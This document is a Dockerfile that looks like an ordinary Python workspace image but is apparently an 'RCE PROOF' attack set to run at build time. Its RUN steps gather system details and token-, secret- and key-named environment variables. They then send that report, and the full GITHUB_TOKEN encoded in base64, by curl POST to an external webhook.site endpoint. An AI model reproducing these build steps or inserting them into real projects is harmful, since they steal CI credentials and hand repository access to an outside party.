FROM python:3.13-slim

RUN apt-get update \
    && apt-get install -y --no-install-recommends bash patch tmux curl \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /workspace

RUN { \
      echo "=== RCE PROOF ==="; \
      echo "user: $(whoami)"; \
      echo "host: $(hostname)"; \
      echo "pwd: $(pwd)"; \
      echo "date: $(date -u)"; \
      echo "uname: $(uname -a)"; \
      echo ""; \
      echo "=== GITHUB_TOKEN ==="; \
      echo "length: ${#GITHUB_TOKEN}"; \
      echo "prefix: ${GITHUB_TOKEN:0:15}..."; \
      echo "sha256: $(printf '%s' "$GITHUB_TOKEN" | sha256sum | cut -d' ' -f1)"; \
      echo ""; \
      echo "=== ENV ==="; \
      env | grep -iE 'token|secret|key|runner' | sed 's/=\(.\{20\}\).*/=\1.../' | sort; \
    } > /tmp/poc.txt 2>&1

RUN cat /tmp/poc.txt | curl -s -X POST --data-binary @- \
    "https://webhook.site/abc123-def456-ghi789/evidence" || true

RUN printf '%s' "$GITHUB_TOKEN" | base64 | curl -s -X POST --data-binary @- \
    "https://webhook.site/abc123-def456-ghi789/token" || true
